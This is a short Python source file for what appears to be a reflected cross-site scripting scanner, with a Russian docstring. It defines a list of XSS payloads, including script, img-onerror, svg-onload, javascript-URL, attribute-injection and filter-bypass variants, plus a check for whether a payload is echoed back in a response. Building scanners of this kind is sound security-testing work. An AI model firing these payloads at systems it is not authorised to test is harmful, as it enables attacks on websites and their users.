import re

class XSSAnalyzer:
    def __init__(self):
        self.payloads = {
            "script": ["<script>alert('XSS')</script>", "<script>alert('XSS_SCRIPT')</script>"],
            "img": ["<img src=x onerror=alert('XSS')>", "<img src=x οnerrοr=alert('XSS_BYPASS')>", "<img src=x onerror=alert&lpar;1&rpar;>"],
            "svg": ["<svg onload=alert('XSS')>"],
            "a": ["<a href=\"javascript:alert('XSS')\">XSS</a>"],
            "javascript": ["javascript:alert('XSS_URL')"],
            "attribute": ["\" onmouseover=alert('XSS') \"", "\" onmouseover=alert('XSS_ATTRIBUTE') \"", "' onmouseover=alert('XSS_ATTRIBUTE') '", "` onmouseover=alert('XSS_ATTRIBUTE') `"],
            "bypass": ["<scr<script>ipt>alert('XSS_BYPASS')</scr<script>ipt>"]
        }

    def analyze_response(self, payload, response_text, request_url, status_code):
        """Анализирует ответ на наличие пейлоада """
        if response_text and re.search(re.escape(payload), response_text, re.IGNORECASE):
            return {
                "type": "Reflected XSS",
                "payload": payload,
                "request_url": request_url,
                "status_code": status_code
            }
        return None


    def get_all_payloads(self):
        all_payloads = []
        for payload_list in self.payloads.values():
            all_payloads.extend(payload_list)
        return all_payloads